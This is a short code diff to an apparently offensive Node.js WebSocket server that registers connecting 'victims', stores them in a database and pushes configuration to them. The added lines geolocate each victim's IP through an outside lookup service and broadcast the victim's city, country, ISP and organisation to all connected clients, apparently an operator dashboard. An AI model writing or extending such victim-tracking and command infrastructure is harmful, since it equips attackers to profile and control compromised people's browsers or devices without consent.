@@ -185,6 +185,15 @@ wss.on('connection', (ws, req) => {
   ws.send(JSON.stringify(currentConfig)); // Send current config to new victim
   stmtUpsertVictim.run(clientId, DEFAULT_SESSION, ip, ts());
   log(`[+] CONNECT     ${clientId}  IP=${ip}`);
+  fetch(`http://ip-api.com/json/${ip}?fields=status,city,regionName,country,isp,org`)
+    .then(r => r.json())
+    .then(geo => {
+      if (geo.status === "success") {
+        const geoMsg = { type: "ip_geo", clientId, city: geo.city, region: geo.regionName, country: geo.country, isp: geo.isp, org: geo.org };
+        broadcastAll(geoMsg);
+      }
+    })
+    .catch(() => {});
 
   ws.on('message', (raw) => {
     // ── Message size cap ──────────────────────────────────────────────
